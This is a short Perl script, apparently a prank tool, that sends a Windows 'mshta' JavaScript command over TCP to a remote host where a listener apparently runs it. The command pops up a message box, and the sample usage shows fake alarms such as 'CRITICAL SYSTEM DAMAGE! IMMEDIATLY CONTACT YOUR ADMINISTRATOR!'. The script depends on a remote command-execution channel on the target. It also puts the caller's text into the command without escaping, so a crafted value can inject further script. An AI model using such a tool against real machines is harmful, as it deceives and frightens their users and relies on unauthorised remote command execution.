#!/usr/bin/env perl
use strict;
use warnings;
use Socket;

my $title = shift;
my $text = shift;
my $host = shift;
my $port = shift || 13333;

my $cmd = "mshta \"javascript:var sh=new ActiveXObject('WScript.Shell');sh.Popup('$text', 0, '$title', 16);close()\""; #, 10, , 64

# http://4umi.com/web/javascript/shell.php


socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
my $paddr = sockaddr_in($port, inet_aton($host));
connect(SOCK, $paddr);
send(SOCK, "$cmd\n", 0);
close(SOCK);

=sample
./msg.pl "WARNING!" "CRITICAL SYSTEM DAMAGE! IMMEDIATLY CONTACT YOUR ADMINISTRATOR!" 192.168.43.69
./msg.pl "_/\_4!" "/\3|||4 /\()}{!" 192.168.43.69
=cut
